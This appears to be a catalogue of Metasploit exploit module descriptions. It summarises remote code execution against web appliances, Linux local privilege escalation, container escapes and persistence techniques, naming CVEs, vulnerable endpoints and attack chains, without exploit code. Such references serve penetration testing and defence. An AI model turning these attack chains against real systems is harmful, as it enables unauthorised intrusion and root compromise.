linux/http/wd_mycloud_multiupload_upload
This module exploits a file upload vulnerability found in Western Digital's MyCloud NAS web administration HTTP service. The /web/jquery/uploader/multi_uploadify.php PHP script provides multipart upload functionality that is accessible without authentication and can be used to place a file anywhere on the device's file system. This allows an attacker the ability to upload a PHP shell onto the device and obtain arbitrary code execution as root.

linux/http/wd_mycloud_unauthenticated_cmd_injection
This module exploits authentication bypass (CVE-2018-17153) and command injection (CVE-2016-10108) vulnerabilities in Western Digital MyCloud before 2.30.196 in order to achieve unauthenticated remote code execution as the root user. The module first performs a check to see if the target is WD MyCloud. If so, it attempts to trigger an authentication bypass (CVE-2018-17153) via a crafted GET request to /cgi-bin/network_mgr.cgi. If the server responds as expected, the module assesses the vulnerability status by attempting to exploit a commend injection vulnerability (CVE-2016-10108) in order to print a random string via the echo command. This is done via a crafted POST request to /web/google_analytics.php. If the server is vulnerable, the same command injection vector is leveraged to execute the payload. This module has been successfully tested against Western Digital MyCloud version 2.30.183. Note: based on the available disclosures, it seems that the command injection vector (CVE-2016-10108) might be exploitable without the authentication bypass (CVE-2018-17153) on versions before 2.21.126. The obtained results on 2.30.183 imply that the patch for CVE-2016-10108 did not actually remove the command injection vector, but only prevented unauthenticated access to it.

linux/http/webcalendar_settings_exec
This module exploits a vulnerability found in k5n.us WebCalendar, version 1.2.4 or less. If not removed, the settings.php script meant for installation can be update by an attacker, and then inject code in it. This allows arbitrary code execution as www-data.

linux/http/webid_converter
This module exploits a vulnerability found in WeBid version 1.0.2. By abusing the converter.php file, a malicious user can inject PHP code in the includes/currencies.php script without any authentication, which results in arbitrary code execution.

linux/http/webmin_backdoor
This module exploits a backdoor in Webmin versions 1.890 through 1.920. Only the SourceForge downloads were backdoored, but they are listed as official downloads on the project's site. Unknown attacker(s) inserted Perl qx statements into the build server's source code on two separate occasions: once in April 2018, introducing the backdoor in the 1.890 release, and in July 2018, reintroducing the backdoor in releases 1.900 through 1.920. Only version 1.890 is exploitable in the default install. Later affected versions require the expired password changing feature to be enabled.

linux/http/webmin_file_manager_rce
In Webmin version 1.984, any authenticated low privilege user without access rights to the File Manager module could interact with file manager functionalities such as downloading files from remote URLs and changing file permissions. It is possible to achieve Remote Code Execution via a crafted .cgi file by chaining those functionalities in the file manager.

linux/http/webmin_package_updates_rce
This module exploits an arbitrary command injection in Webmin versions prior to 1.997. Webmin uses the OS package manager (`apt`, `yum`, etc.) to perform package updates and installation. Due to a lack of input sanitization, it is possibe to inject arbitrary command that will be concatenated to the package manager call. This exploit requires authentication and the account must have access to the Software Package Updates module.

linux/http/webmin_packageup_rce
This module exploits an arbitrary command execution vulnerability in Webmin 1.910 and lower versions. Any user authorized to the "Package Updates" module can execute arbitrary commands with root privileges.

linux/http/wepresent_cmd_injection
This module exploits an unauthenticated remote command injection vulnerability found in Barco WePresent and related OEM'ed products. The vulnerability is triggered via an HTTP POST request to the file_transfer.cgi endpoint.

linux/http/wipg1000_cmd_injection
This module exploits a command injection vulnerability in an undocumented CGI file in several versions of the WePresent WiPG-1000 devices. Version 2.0.0.7 was confirmed vulnerable, 2.2.3.0 patched this vulnerability.

linux/http/xplico_exec
This module exploits command injection vulnerability. Unauthenticated users can register a new account and then execute a terminal command under the context of the root user. The specific flaw exists within the Xplico, which listens on TCP port 9876 by default. The goal of Xplico is extract from an internet traffic capture the applications data contained. There is a hidden end-point at inside of the Xplico that allow anyone to create a new user. Once the user created through /users/register endpoint, it must be activated via activation e-mail. After the registration Xplico try to send e-mail that contains activation code. Unfortunetly, this e-mail probably not gonna reach to the given e-mail address on most of installation. But it's possible to calculate exactly same token value because of insecure cryptographic random string generator function usage. One of the feature of Xplico is related to the parsing PCAP files. Once PCAP file uploaded, Xplico execute an operating system command in order to calculate checksum of the file. Name of the for this operation is direclty taken from user input and then used at inside of the command without proper input validation.

linux/http/zabbix_sqli
This module exploits an unauthenticated SQL injection vulnerability affecting Zabbix versions 2.0.8 and lower. The SQL injection issue can be abused in order to retrieve an active session ID. If an administrator level user is identified, remote code execution can be gained by uploading and executing remote scripts via the 'scripts_exec.php' file.

linux/http/zen_load_balancer_exec
This module exploits a vulnerability in ZEN Load Balancer version 2.0 and 3.0-rc1 which could be abused to allow authenticated users to execute arbitrary code under the context of the 'root' user. The 'content2-2.cgi' file uses user controlled data from the 'filelog' parameter within backticks.

linux/http/zenoss_showdaemonxmlconfig_exec
This module exploits a command execution vulnerability in Zenoss 3.x which could be abused to allow authenticated users to execute arbitrary code under the context of the 'zenoss' user. The show_daemon_xml_configs() function in the 'ZenossInfo.py' script calls Popen() with user controlled data from the 'daemon' parameter.

linux/http/zimbra_cpio_cve_2022_41352
This module creates a .tar file that can be emailed to a Zimbra server to exploit CVE-2022-41352. If successful, it plants a JSP-based backdoor in the public web directory, then executes that backdoor. The core vulnerability is a path-traversal issue in the cpio command- line utlity that can extract an arbitrary file to an arbitrary location on a Linux system (CVE-2015-1197). Most Linux distros have chosen not to fix it. This issue is exploitable on Red Hat-based systems (and other hosts without pax installed) running versions: * Zimbra Collaboration Suite 9.0.0 Patch 26 (and earlier) * Zimbra Collaboration Suite 8.8.15 Patch 33 (and earlier) The patch simply makes "pax" a pre-requisite.

linux/http/zimbra_mboximport_cve_2022_27925
This module POSTs a ZIP file containing path traversal characters to the administrator interface for Zimbra Collaboration Suite. If successful, it plants a JSP-based backdoor within the web directory, then executes it. The core vulnerability is a path-traversal issue in Zimbra Collaboration Suite's ZIP implementation that can result in the extraction of an arbitrary file to an arbitrary location on the host. This issue is exploitable on the following versions of Zimbra: * Zimbra Collaboration Suite Network Edition 9.0.0 Patch 23 (and earlier) * Zimbra Collaboration Suite Network Edition 8.8.15 Patch 30 (and earlier) Note that the Open Source Edition is not affected.

linux/http/zimbra_unrar_cve_2022_30333
This module creates a RAR file that can be emailed to a Zimbra server to exploit CVE-2022-30333. If successful, it plants a JSP-based backdoor in the public web directory, then executes that backdoor. The core vulnerability is a path-traversal issue in unRAR that can extract an arbitrary file to an arbitrary location on a Linux system. This issue is exploitable on the following versions of Zimbra, provided UnRAR version 6.11 or earlier is installed: * Zimbra Collaboration 9.0.0 Patch 24 (and earlier) * Zimbra Collaboration 8.8.15 Patch 31 (and earlier)

linux/http/zimbra_xxe_rce
This module exploits an XML external entity vulnerability and a server side request forgery to get unauthenticated code execution on Zimbra Collaboration Suite. The XML external entity vulnerability in the Autodiscover Servlet is used to read a Zimbra configuration file that contains an LDAP password for the 'zimbra' account. The zimbra credentials are then used to get a user authentication cookie with an AuthRequest message. Using the user cookie, a server side request forgery in the Proxy Servlet is used to proxy an AuthRequest with the 'zimbra' credentials to the admin port to retrieve an admin cookie. After gaining an admin cookie the Client Upload servlet is used to upload a JSP webshell that can be triggered from the web server to get command execution on the host. The issues reportedly affect Zimbra Collaboration Suite v8.5 to v8.7.11. This module was tested with Zimbra Release 8.7.1.GA.1670.UBUNTU16.64 UBUNTU16_64 FOSS edition.

linux/http/zyxel_lfi_unauth_ssh_rce
This module exploits multiple vulnerabilities in the `zhttpd` binary (/bin/zhttpd) and `zcmd` binary (/bin/zcmd). It is present on more than 40 Zyxel routers and CPE devices. The remote code execution vulnerability can be exploited by chaining the local file disclosure vulnerability in the zhttpd binary that allows an unauthenticated attacker to read the entire configuration of the router via the vulnerable endpoint `/Export_Log?/data/zcfg_config.json`. With this information disclosure, the attacker can determine if the router is reachable via ssh and use the second vulnerability in the `zcmd` binary to derive the `supervisor` password exploiting a weak implementation of a password derivation algorithm using the device serial number. After exploitation, an attacker will be able to execute any command as user `supervisor`.

linux/http/zyxel_ztp_rce
This module exploits CVE-2022-30525, an unauthenticated remote command injection vulnerability affecting Zyxel firewalls with zero touch provisioning (ZTP) support. By sending a malicious setWanPortSt command containing an mtu field with a crafted OS command to the /ztp/cgi-bin/handler page, an attacker can gain remote command execution as the nobody user. Affected Zyxel models are: * USG FLEX 50, 50W, 100W, 200, 500, 700 using firmware 5.21 and below * USG20-VPN and USG20W-VPN using firmware 5.21 and below * ATP 100, 200, 500, 700, 800 using firmware 5.21 and below

linux/ids/alienvault_centerd_soap_exec
This module exploits a code execution flaw in AlienVault 4.6.1 and prior. The vulnerability exists in the av-centerd SOAP web service, where the update_system_info_debian_package method uses perl backticks in an insecure way, allowing command injection. This module has been tested successfully on AlienVault 4.6.0.

linux/ids/snortbopre
This module exploits a stack buffer overflow in the Back Orifice pre-processor module included with Snort versions 2.4.0, 2.4.1, 2.4.2, and 2.4.3. This vulnerability could be used to completely compromise a Snort sensor, and would typically gain an attacker full root or administrative privileges.

linux/imap/imap_uw_lsub
This module exploits a buffer overflow in the 'LSUB' command of the University of Washington IMAP service. This vulnerability can only be exploited with a valid username and password.

linux/local/abrt_raceabrt_priv_esc
This module attempts to gain root privileges on Linux systems with a vulnerable version of Automatic Bug Reporting Tool (ABRT) configured as the crash handler. A race condition allows local users to change ownership of arbitrary files (CVE-2015-3315). This module uses a symlink attack on `/var/tmp/abrt/*/maps` to change the ownership of `/etc/passwd`, then adds a new user with UID=0 GID=0 to gain root privileges. Winning the race could take a few minutes. This module has been tested successfully on: abrt 2.1.11-12.el7 on RHEL 7.0 x86_64; abrt 2.1.5-1.fc19 on Fedora Desktop 19 x86_64; abrt 2.2.1-1.fc19 on Fedora Desktop 19 x86_64; abrt 2.2.2-2.fc20 on Fedora Desktop 20 x86_64; abrt 2.3.0-3.fc21 on Fedora Desktop 21 x86_64.

linux/local/abrt_sosreport_priv_esc
This module attempts to gain root privileges on RHEL systems with a vulnerable version of Automatic Bug Reporting Tool (ABRT) configured as the crash handler. `sosreport` uses an insecure temporary directory, allowing local users to write to arbitrary files (CVE-2015-5287). This module uses a symlink attack on `/var/tmp/abrt/cc-*$pid/` to overwrite the `modprobe` path in `/proc/sys/kernel/modprobe`, resulting in root privileges. Waiting for `sosreport` could take a few minutes. This module has been tested successfully on: abrt 2.1.11-12.el7 on RHEL 7.0 x86_64; and abrt 2.1.11-19.el7 on RHEL 7.1 x86_64.

linux/local/af_packet_chocobo_root_priv_esc
This module exploits a race condition and use-after-free in the packet_set_ring function in net/packet/af_packet.c (AF_PACKET) in the Linux kernel to execute code as root (CVE-2016-8655). The bug was initially introduced in 2011 and patched in 2016 in version 4.4.0-53.74, potentially affecting a large number of kernels; however this exploit targets only systems using Ubuntu (Trusty / Xenial) kernels 4.4.0 < 4.4.0-53, including Linux distros based on Ubuntu, such as Linux Mint. The target system must have unprivileged user namespaces enabled, two or more CPU cores, and SMAP must be disabled. Bypasses for SMEP and KASLR are included. Failed exploitation may crash the kernel. This module has been tested successfully on Linux Mint 17.3 (x86_64); Linux Mint 18 (x86_64); Ubuntu 16.04 (x86_64); and Ubuntu 16.04.2 (x86_64).

linux/local/af_packet_packet_set_ring_priv_esc
This module exploits a heap-out-of-bounds write in the packet_set_ring function in net/packet/af_packet.c (AF_PACKET) in the Linux kernel to execute code as root (CVE-2017-7308). The bug was initially introduced in 2011 and patched in version 4.10.6, potentially affecting a large number of kernels; however this exploit targets only systems using Ubuntu Xenial kernels 4.8.0 < 4.8.0-46, including Linux distros based on Ubuntu Xenial, such as Linux Mint. The target system must have unprivileged user namespaces enabled and two or more CPU cores. Bypasses for SMEP, SMAP and KASLR are included. Failed exploitation may crash the kernel. This module has been tested successfully on Linux Mint 18 (x86_64) with kernel versions: 4.8.0-34-generic; 4.8.0-36-generic; 4.8.0-39-generic; 4.8.0-41-generic; 4.8.0-42-generic; 4.8.0-44-generic; 4.8.0-45-generic.

linux/local/apport_abrt_chroot_priv_esc
This module attempts to gain root privileges on Linux systems by invoking the default coredump handler inside a namespace ("container"). Apport versions 2.13 through 2.17.x before 2.17.1 on Ubuntu are vulnerable, due to a feature which allows forwarding reports to a container's Apport by changing the root directory before loading the crash report, causing `usr/share/apport/apport` within the crashed task's directory to be executed. Similarly, Fedora is vulnerable when the kernel crash handler is configured to change root directory before executing ABRT, causing `usr/libexec/abrt-hook-ccpp` within the crashed task's directory to be executed. In both instances, the crash handler does not drop privileges, resulting in code execution as root. This module has been tested successfully on Apport 2.14.1 on Ubuntu 14.04.1 LTS x86 and x86_64 and ABRT on Fedora 19 and 20 x86_64.

linux/local/apt_package_manager_persistence
This module will run a payload when the package manager is used. No handler is ran automatically so you must configure an appropriate exploit/multi/handler to connect. This module creates a pre-invoke hook for APT in apt.conf.d. The hook name syntax is numeric followed by text.

linux/local/asan_suid_executable_priv_esc
This module attempts to gain root privileges on Linux systems using setuid executables compiled with AddressSanitizer (ASan). ASan configuration related environment variables are permitted when executing setuid executables built with libasan. The `log_path` option can be set using the `ASAN_OPTIONS` environment variable, allowing clobbering of arbitrary files, with the privileges of the setuid user. This module uploads a shared object and sprays symlinks to overwrite `/etc/ld.so.preload` in order to create a setuid root shell.

linux/local/autostart_persistence
This module will create an autostart entry to execute a payload. The payload will be executed when the users logs in.

linux/local/bash_profile_persistence
This module writes an execution trigger to the target's Bash profile. The execution trigger executes a call back payload whenever the target user opens a Bash terminal. A handler is not run automatically, so you must configure an appropriate exploit/multi/handler to receive the callback.

linux/local/blueman_set_dhcp_handler_dbus_priv_esc
This module attempts to gain root privileges by exploiting a Python code injection vulnerability in blueman versions prior to 2.0.3. The `org.blueman.Mechanism.EnableNetwork` D-Bus interface exposes the `set_dhcp_handler` function which uses user input in a call to `eval`, without sanitization, resulting in arbitrary code execution as root. This module has been tested successfully with blueman version 1.23 on Debian 8 Jessie (x64).

linux/local/bpf_priv_esc
Linux kernel 4.4 < 4.5.5 extended Berkeley Packet Filter (eBPF) does not properly reference count file descriptors, resulting in a use-after-free, which can be abused to escalate privileges. The target system must be compiled with `CONFIG_BPF_SYSCALL` and must not have `kernel.unprivileged_bpf_disabled` set to 1. Note, this module will overwrite the first few lines of `/etc/crontab` with a new cron job. The job will need to be manually removed. This module has been tested successfully on Ubuntu 16.04 (x64) kernel 4.4.0-21-generic (default kernel).

linux/local/bpf_sign_extension_priv_esc
Linux kernel prior to 4.14.8 contains a vulnerability in the Berkeley Packet Filter (BPF) verifier. The `check_alu_op` function performs incorrect sign extension which allows the verifier to be bypassed, leading to arbitrary kernel read/write. The target system must be compiled with BPF support and permit unprivileged access to BPF with `kernel.unprivileged_bpf_disabled` not set to 1. This module has been tested successfully on: Debian 9.0 kernel 4.9.0-3-amd64; Deepin 15.5 kernel 4.9.0-deepin13-amd64; ElementaryOS 0.4.1 kernel 4.8.0-52-generic; Fedora 24 kernel 4.5.5-300.fc24.x86_64; Fedora 25 kernel 4.8.6-300.fc25.x86_64; Fedora 26 kernel 4.11.8-300.fc26.x86_64; Fedora 27 kernel 4.13.9-300.fc27.x86_64; Gentoo 2.2 kernel 4.5.2-aufs-r; Linux Mint 17.3 kernel 4.4.0-89-generic; Linux Mint 18.0 kernel 4.8.0-58-generic; Linux Mint 18.3 kernel 4.13.0-16-generic; Mageia 6 kernel 4.9.35-desktop-1.mga6; Manjero 16.10 kernel 4.4.28-2-MANJARO; Solus 3 kernel 4.12.7-11.current; Ubuntu 14.04.1 kernel 4.4.0-89-generic; Ubuntu 16.04.2 kernel 4.8.0-45-generic; Ubuntu 16.04.3 kernel 4.10.0-28-generic; Ubuntu 17.04 kernel 4.10.0-19-generic; ZorinOS 12.1 kernel 4.8.0-39-generic.

linux/local/cpi_runrshell_priv_esc
This modules exploits a vulnerability in Cisco Prime Infrastructure's runrshell binary. The runrshell binary is meant to execute a shell script as root, but can be abused to inject extra commands in the argument, allowing you to execute anything as root.

linux/local/cron_persistence
This module will create a cron or crontab entry to execute a payload. The module includes the ability to automatically clean up those entries to prevent multiple executions. syslog will get a copy of the cron entry.

linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe
Linux kernels from 5.7-rc1 prior to 5.13-rc4, 5.12.4, 5.11.21, and 5.10.37 are vulnerable to a bug in the eBPF verifier's verification of ALU32 operations in the scalar32_min_max_and function when performing AND operations, whereby under certain conditions the bounds of a 32 bit register would not be properly updated. This can be abused by attackers to conduct an out of bounds read and write in the Linux kernel and therefore achieve arbitrary code execution as the root user. The target system must be compiled with eBPF support and not have kernel.unprivileged_bpf_disabled set, which prevents unprivileged users from loading eBPF programs into the kernel. Note that if kernel.unprivileged_bpf_disabled is enabled this module can still be utilized to bypass protections such as SELinux, however the user must already be logged as a privileged user such as root.

linux/local/cve_2021_3493_overlayfs
This module exploits a vulnerability in Ubuntu's implementation of overlayfs. The vulnerability is the result of failing to verify the ability of a user to set the attributes in a running executable. Specifically, when Overlayfs sends the set attributes data to the underlying file system via `vfs_setxattr`, it fails to first verify the data by calling `cap_convert_nscap`. This vulnerability was patched by moving the call to `cap_convert_nscap` into the `vfs_setxattr` function that sets the attribute, forcing verification every time the `vfs_setxattr` is called rather than trusting the data was already verified.

linux/local/cve_2021_38648_omigod
By removing the authentication exchange, an attacker can issue requests to the local OMI management socket that will cause it to execute an operating system command as the root user. This vulnerability was patched in OMI version 1.6.8-1 (released September 8th 2021).

linux/local/cve_2021_4034_pwnkit_lpe_pkexec
A bug exists in the polkit pkexec binary in how it processes arguments. If the binary is provided with no arguments, it will continue to process environment variables as argument variables, but without any security checking. By using the execve call we can specify a null argument list and populate the proper environment variables. This exploit is architecture independent.

linux/local/cve_2022_0847_dirtypipe
This exploit targets a vulnerability in the Linux kernel since 5.8, that allows writing of read only or immutable memory. The vulnerability was fixed in Linux 5.16.11, 5.15.25 and 5.10.102. The module exploits this vulnerability by overwriting a suid binary with the payload, executing it, and then writing the original data back. There are two major limitations of this exploit: the offset cannot be on a page boundary (it needs to write one byte before the offset to add a reference to this page to the pipe), and the write cannot cross a page boundary. This means the payload must be less than the page size (4096 bytes).

linux/local/cve_2022_0995_watch_queue
This module exploits a vulnerability in the Linux Kernel's watch_queue event notification system. It relies on a heap out-of-bounds write in kernel memory. The exploit may fail on the first attempt so multiple attempts may be needed. Note that the exploit can potentially cause a denial of service if multiple failed attemps occur, however this is unlikely.

linux/local/cve_2022_1043_io_uring_priv_esc
This module exploits a bug in io_uring leading to an additional put_cred() that can be exploited to hijack credentials of other processes. We spawn SUID programs to get the free'd cred object reallocated by a privileged process and abuse them to create a SUID root binary ourselves that'll pop a shell. The dangling cred pointer will, however, lead to a kernel panic as soon as the task terminates and its credentials are destroyed. We therefore detach from the controlling terminal, block all signals and rest in silence until the system shuts down and we get killed hard, just to cry in vain, seeing the kernel collapse. The bug affected kernels from v5.12-rc3 to v5.14-rc7. More than 1 CPU is required for exploitation. Successfully tested against Ubuntu 22.04.01 with kernel 5.13.12-051312-generic

linux/local/desktop_privilege_escalation
This module steals the user password of an administrative user on a desktop Linux system when it is entered for unlocking the screen or for doing administrative actions using PolicyKit. Then, it escalates to root privileges using sudo and the stolen user password. It exploits the design weakness that there is no trusted channel for transferring the password from the keyboard to the actual password verification against the shadow file (which is running as root since /etc/shadow is only readable to the root user). Both screensavers (xscreensaver/gnome-screensaver) and PolicyKit use a component running under the current user account to query for the password and then pass it to a setuid-root binary to do the password verification. Therefore, it is possible to inject a password stealer after compromising the user account. Since sudo requires only the user password (and not the root password of the system), stealing the user password of an administrative user directly allows escalating to root privileges. Please note, you have to start a handler as a background job before running this exploit since the exploit will only create a shell when the user actually enters the password (which may be hours after launching the exploit). Using exploit/multi/handler with the option ExitOnSession set to false should do the job.

linux/local/diamorphine_rootkit_signal_priv_esc
This module uses Diamorphine rootkit's privesc feature using signal 64 to elevate the privileges of arbitrary processes to UID 0 (root). This module has been tested successfully with Diamorphine from `master` branch (2019-10-04) on Linux Mint 19 kernel 4.15.0-20-generic (x64).

linux/local/docker_daemon_privilege_escalation
This module obtains root privileges from any host account with access to the Docker daemon. Usually this includes accounts in the `docker` group.

linux/local/docker_privileged_container_escape
This module escapes from a privileged Docker container and obtains root on the host machine by abusing the Linux cgroup notification on release feature. This exploit should work against any container started with the following flags: `--cap-add=SYS_ADMIN`, `--privileged`.

linux/local/docker_runc_escape
This module leverages a flaw in `runc` to escape a Docker container and get command execution on the host as root. This vulnerability is identified as CVE-2019-5736. It overwrites the `runc` binary with the payload and wait for someone to use `docker exec` to get into the container. This will trigger the payload execution. Note that executing this exploit carries important risks regarding the Docker installation integrity on the target and inside the container ('Side Effects' section in the documentation).

linux/local/exim4_deliver_message_priv_esc
This module exploits a flaw in Exim versions 4.87 to 4.91 (inclusive). Improper validation of recipient address in deliver_message() function in /src/deliver.c may lead to command execution with root privileges (CVE-2019-10149).

linux/local/f5_create_user
This creates a local user with a username/password and root-level privileges. Note that a root-level account is not required to do this, which makes it a privilege escalation issue. Note that this is pretty noisy, since it creates a user account and creates log files and such. Additionally, most (if not all) vulnerabilities in F5 grant root access anyways. Adapted from https://github.com/rbowes-r7/refreshing-mcp-tool/blob/main/mcp-privesc.rb

linux/local/glibc_ld_audit_dso_load_priv_esc
This module attempts to gain root privileges on Linux systems by abusing a vulnerability in the GNU C Library (glibc) dynamic linker. glibc ld.so in versions before 2.11.3, and 2.12.x before 2.12.2 does not properly restrict use of the LD_AUDIT environment variable when loading setuid executables. This allows loading arbitrary shared objects from the trusted library search path with the privileges of the suid user. This module uses LD_AUDIT to load the libpcprofile.so shared object, distributed with some versions of glibc, and leverages arbitrary file creation functionality in the library constructor to write a root-owned world-writable file to a system trusted search path (usually /lib). The file is then overwritten with a shared object then loaded with LD_AUDIT resulting in arbitrary code execution. This module has been tested successfully on glibc version 2.11.1 on Ubuntu 10.04 x86_64 and version 2.7 on Debian 5.0.4 i386. RHEL 5 is reportedly affected, but untested. Some glibc distributions do not contain the libpcprofile.so library required for successful exploitation.

linux/local/glibc_origin_expansion_priv_esc
This module attempts to gain root privileges on Linux systems by abusing a vulnerability in the GNU C Library (glibc) dynamic linker. glibc `ld.so` versions before 2.11.3, and 2.12.x before 2.12.2 does not properly restrict use of the `LD_AUDIT` environment variable when loading setuid executables which allows control over the `$ORIGIN` library search path resulting in execution of arbitrary shared objects. This module opens a file descriptor to the specified suid executable via a hard link, then replaces the hard link with a shared object before instructing the linker to execute the file descriptor, resulting in arbitrary code execution. The specified setuid binary must be readable and located on the same file system partition as the specified writable directory. This module has been tested successfully on: glibc 2.5 on CentOS 5.4 (x86_64); glibc 2.5 on CentOS 5.5 (x86_64); glibc 2.12 on Fedora 13 (i386); and glibc 2.5-49 on RHEL 5.5 (x86_64). Some versions of `ld.so`, such as the version shipped with Ubuntu 14, hit a failed assertion in `dl_open_worker` causing exploitation to fail.

linux/local/glibc_realpath_priv_esc
This module attempts to gain root privileges on Linux systems by abusing a vulnerability in GNU C Library (glibc) version 2.26 and prior. This module uses halfdog's RationalLove exploit to exploit a buffer underflow in glibc realpath() and create a SUID root shell. The exploit has offsets for glibc versions 2.23-0ubuntu9 and 2.24-11+deb9u1. The target system must have unprivileged user namespaces enabled. This module has been tested successfully on Ubuntu Linux 16.04.3 (x86_64) with glibc version 2.23-0ubuntu9; and Debian 9.0 (x86_64) with glibc version 2.24-11+deb9u1.

linux/local/hp_smhstart
Versions of HP System Management Homepage <= 7.1.2 include a setuid root smhstart which is vulnerable to a local buffer overflow in SSL_SHARE_BASE_DIR env variable.

linux/local/hp_xglance_priv_esc
This exploit takes advantage of xglance-bin, part of HP's Glance (or Performance Monitoring) version 11 'and subsequent' , which was compiled with an insecure RPATH option. The RPATH includes a relative path to -L/lib64/ which can be controlled by a user. Creating libraries in this location will result in an escalation of privileges to root.

linux/local/juju_run_agent_priv_esc
This module attempts to gain root privileges on Juju agent systems running the juju-run agent utility. Juju agent systems running agent tools prior to version 1.25.12, 2.0.x before 2.0.4, and 2.1.x before 2.1.3, provide a UNIX domain socket to manage software ("units") without setting appropriate permissions, allowing unprivileged local users to execute arbitrary commands as root. This module has been tested successfully with Juju agent tools versions 1.18.4, 1.25.5 and 1.25.9 on Ubuntu 14.04.1 LTS x86 deployed by Juju 1.18.1-trusty-amd64 and 1.25.6-trusty-amd64 on Ubuntu 14.04.1 LTS x86_64.

linux/local/kloxo_lxsuexec
Version 6.1.12 and earlier of Kloxo contain two setuid root binaries such as lxsuexec and lxrestart, allow local privilege escalation to root from uid 48, Apache by default on CentOS 5.8, the operating system supported by Kloxo. This module has been tested successfully with Kloxo 6.1.12 and 6.1.6.

linux/local/ktsuss_suid_priv_esc
This module attempts to gain root privileges by exploiting a vulnerability in ktsuss versions 1.4 and prior. The ktsuss executable is setuid root and does not drop privileges prior to executing user specified commands, resulting in command execution with root privileges. This module has been tested successfully on: ktsuss 1.3 on SparkyLinux 6 (2019.08) (LXQT) (x64); and ktsuss 1.3 on SparkyLinux 5.8 (LXQT) (x64).

linux/local/lastore_daemon_dbus_priv_esc
This module attempts to gain root privileges on Deepin Linux systems by using lastore-daemon to install a package. The lastore-daemon D-Bus configuration on Deepin Linux permits any user in the sudo group to install arbitrary system packages without providing a password, resulting in code execution as root. By default, the first user created on the system is a member of the sudo group. This module has been tested successfully with lastore-daemon versions 0.9.53-1 on Deepin Linux 15.5 (x64); and 0.9.66-1 on Deepin Linux 15.7 (x64).

linux/local/libuser_roothelper_priv_esc
This module attempts to gain root privileges on Red Hat based Linux systems, including RHEL, Fedora and CentOS, by exploiting a newline injection vulnerability in libuser and userhelper versions prior to 0.56.13-8 and version 0.60 before 0.60-7. This module makes use of the roothelper.c exploit from Qualys to insert a new user with UID=0 in /etc/passwd. Note, the password for the current user is required by userhelper. Note, on some systems, such as Fedora 11, the user entry for the current user in /etc/passwd will become corrupted and exploitation will fail. This module has been tested successfully on libuser packaged versions 0.56.13-4.el6 on CentOS 6.0 (x86_64); 0.56.13-5.el6 on CentOS 6.5 (x86_64); 0.60-5.el7 on CentOS 7.1-1503 (x86_64); 0.56.16-1.fc13 on Fedora 13 (i686); 0.59-1.fc19 on Fedora Desktop 19 (x86_64); 0.60-3.fc20 on Fedora Desktop 20 (x86_64); 0.60-6.fc21 on Fedora Desktop 21 (x86_64); 0.60-6.fc22 on Fedora Desktop 22 (x86_64); 0.56.13-5.el6 on Red Hat 6.6 (x86_64); and 0.60-5.el7 on Red Hat 7.0 (x86_64). RHEL 5 is vulnerable, however the installed version of glibc (2.5) is missing various functions required by roothelper.c.

linux/local/nested_namespace_idmap_limit_priv_esc
This module exploits a vulnerability in Linux kernels 4.15.0 to 4.18.18, and 4.19.0 to 4.19.1, where broken uid/gid mappings between nested user namespaces and kernel uid/gid mappings allow elevation to root (CVE-2018-18955). The target system must have unprivileged user namespaces enabled and the newuidmap and newgidmap helpers installed (from uidmap package). This module has been tested successfully on: Fedora Workstation 28 kernel 4.16.3-301.fc28.x86_64; Kubuntu 18.04 LTS kernel 4.15.0-20-generic (x86_64); Linux Mint 19 kernel 4.15.0-20-generic (x86_64); Ubuntu Linux 18.04.1 LTS kernel 4.15.0-20-generic (x86_64).

linux/local/netfilter_nft_set_elem_init_privesc
An issue was discovered in the Linux kernel through 5.18.9. A type confusion bug in nft_set_elem_init (leading to a buffer overflow) could be used by a local attacker to escalate privileges. The attacker can obtain root access, but must start with an unprivileged user namespace to obtain CAP_NET_ADMIN access. The issue exists in nft_setelem_parse_data in net/netfilter/nf_tables_api.c.

linux/local/netfilter_priv_esc_ipv4
This module attempts to exploit a netfilter bug on Linux Kernels before 4.6.3, and currently only works against Ubuntu 16.04 (not 16.04.1) with kernel 4.4.0-21-generic. Several conditions have to be met for successful exploitation: Ubuntu: 1. ip_tables.ko (ubuntu), iptable_raw (fedora) has to be loaded (root running iptables -L will do such) 2. libc6-dev-i386 (ubuntu), glibc-devel.i686 & libgcc.i686 (fedora) needs to be installed to compile Kernel 4.4.0-31-generic and newer are not vulnerable. This exploit does not bypass SMEP/SMAP. We write the ascii files and compile on target instead of locally since metasm bombs for not having cdefs.h (even if locally installed)

linux/local/netfilter_xtables_heap_oob_write_priv_esc
A heap out-of-bounds write affecting Linux since v2.6.19-rc1 was discovered in net/netfilter/x_tables.c. This allows an attacker to gain privileges or cause a DoS (via heap memory corruption) through user name space. Kernels up to 5.11 (including) are vulnerable. More information about vulnerable kernels is available at https://nvd.nist.gov/vuln/detail/CVE-2021-22555#vulnConfigurationsArea

linux/local/network_manager_vpnc_username_priv_esc
This module exploits an injection vulnerability in the Network Manager VPNC plugin to gain root privileges. This module uses a new line injection vulnerability in the configured username for a VPN network connection to inject a `Password helper` configuration directive into the connection configuration. The specified helper is executed by Network Manager as root when the connection is started. Network Manager VPNC versions prior to 1.2.6 are vulnerable. This module has been tested successfully with VPNC versions: 1.2.4-4 on Debian 9.0.0 (x64); and 1.1.93-1 on Ubuntu Linux 16.04.4 (x64).

linux/local/ntfs3g_priv_esc
ntfs-3g mount helper in Ubuntu 16.04, 16.10, Debian 7, 8, and possibly 9 does not properly sanitize the environment when executing modprobe. This can be abused to load a kernel module and execute a binary payload as the root user.

linux/local/omniresolve_suid_priv_esc
This module exploits the trusted `$PATH` environment variable of the SUID binary `omniresolve` in Micro Focus (HPE) Data Protector A.10.40 and prior. The `omniresolve` executable calls the `oracleasm` binary using a relative path and the trusted environment `$PATH`, which allows an attacker to execute a custom binary with `root` privileges. This module has been successfully tested on: HPE Data Protector A.09.07: OMNIRESOLVE, internal build 110, built on Thu Aug 11 14:52:38 2016; Micro Focus Data Protector A.10.40: OMNIRESOLVE, internal build 118, built on Tue May 21 05:49:04 2019 on CentOS Linux release 7.6.1810 (Core) The vulnerability has been patched in: Micro Focus Data Protector A.10.40: OMNIRESOLVE, internal build 125, built on Mon Aug 19 19:22:20 2019

linux/local/overlayfs_priv_esc
